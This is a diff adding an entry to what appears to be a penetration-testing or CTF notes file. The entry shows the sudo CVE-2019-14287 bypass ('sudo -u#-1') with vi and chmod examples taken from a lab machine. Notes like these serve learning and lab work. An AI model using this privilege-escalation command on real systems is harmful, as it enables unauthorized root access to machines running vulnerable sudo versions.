@@ -186,6 +186,22 @@ export TERM=xterm
 
 3. you get find possible escalation scripts at [GTFObins](https://gtfobins.github.io/)
 
+4. [CVE-2019-14287 user sudo -u#-1](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)
+```
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+    
+#you can run the following below as sudo
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
+```
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/chmod
+
+# you can run
+sudo -u#-1 /usr/bin/chmod
+```
+
 ## Recommended Burpsuite Additional Module Copy As Python-Requests
 1. Go to ```Extender``` Tab
 2. Under ```BApp Store``` Tab
